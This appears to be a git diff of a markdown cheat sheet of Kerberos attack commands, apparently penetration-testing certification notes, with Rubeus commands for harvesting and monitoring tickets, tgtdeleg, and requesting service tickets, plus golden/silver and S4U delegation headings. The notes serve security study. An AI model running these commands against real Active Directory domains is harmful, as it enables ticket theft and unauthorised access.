@@ -479,6 +479,9 @@ Get tickets currently on System:
 - All - ```Rubeus.exe harvest /interval:30```
 - Specific User on Machine - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
 
+#### Tgtdeleg
+Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
+
 #### Pass-the-key/Over-PTH
 Request ticket (TGT) based on username and password/hash:
 ```
@@ -490,9 +493,6 @@ Request Service ticket (TGS) based on Service Name:
 ```
 Rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab
 ```
-
-#### Tgtdeleg
-Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
 
 #### Golden/Silver
 Hash of a user:
@@ -523,7 +523,8 @@ We can purge by LUID also:
 
 #### S4U
 Kerberos Delegation and S4U:
-- [S4u](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-unconstrained-delegation-attack-flow-with-spoolsample)
+- [unconstrained s4u](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-unconstrained-delegation-attack-flow-with-spoolsample)
+- [constrained s4u]
 
 
 # Check ACLs
